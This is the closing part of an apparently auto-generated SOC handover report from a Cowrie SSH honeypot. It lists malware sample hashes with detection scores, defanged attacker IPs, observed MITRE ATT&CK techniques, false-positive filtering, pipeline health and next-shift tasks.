| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `159.203.20[.]239` | CA | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `35.202.9[.]133` | US | Google LLC | **100** ⚠️ | 50 |
| `8.209.88[.]212` | DE | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 24 |
| `180.76.172[.]156` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `135.148.33[.]168` | US | OVH US LLC | **100** ⚠️ | 8 |
| `40.121.179[.]100` | US | Microsoft Corporation | **100** ⚠️ | 16 |
| `118.26.36[.]248` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `187.108.193[.]54` | BR | EVEO S.A. | **100** ⚠️ | 10 |
| `14.103.112[.]1` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `174.76.38[.]124` | US | Cox Communications Inc. | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 28 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 13 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 11 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 15 below threshold 25 | 2 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 95 cases |
| Tool 34  | Credential Extractor        | ✅ 25 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 15 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (7.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 13 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 9 priority case(s) shown individually · 10 recon entry/entries in table (4 group(s) consolidating 73 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-31T19:22:41Z_
